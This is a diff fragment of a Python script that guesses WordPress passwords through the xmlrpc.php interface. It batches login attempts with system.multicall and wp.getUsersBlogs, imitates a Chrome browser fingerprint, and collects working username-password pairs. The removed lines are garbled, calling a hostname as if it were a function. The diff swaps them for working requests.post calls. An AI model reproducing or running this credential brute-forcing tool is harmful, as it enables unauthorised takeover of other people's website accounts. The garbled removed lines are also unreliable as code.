@@ -56,7 +56,7 @@ def multicall(pairs):
     body = ('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
             '<params><param><value><array><data>' + calls + '</data></array></value></param></params>'
             '</methodCall>')
-    r = target9.example.com(BASE + "/xmlrpc.php", data=body, impersonate="chrome", timeout=40,
+    r = requests.post(BASE + "/xmlrpc.php", data=body, impersonate="chrome", timeout=40,
                       headers={"Content-Type": "text/xml", "User-Agent": UA})
     return r.status_code, r.text
 
@@ -76,7 +76,7 @@ for i in range(0, len(queue), BATCH):
             b = ('<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>'
                  '<params><param><value><string>%s</string></value></param>'
                  '<param><value><string>%s</string></value></param></params></methodCall>' % (u, p))
-            rr = target9.example.com(BASE + "/xmlrpc.php", data=b, impersonate="chrome", timeout=25,
+            rr = requests.post(BASE + "/xmlrpc.php", data=b, impersonate="chrome", timeout=25,
                                headers={"Content-Type": "text/xml", "User-Agent": UA})
             if "blogName" in rr.text:
                 hits.append((u, p))
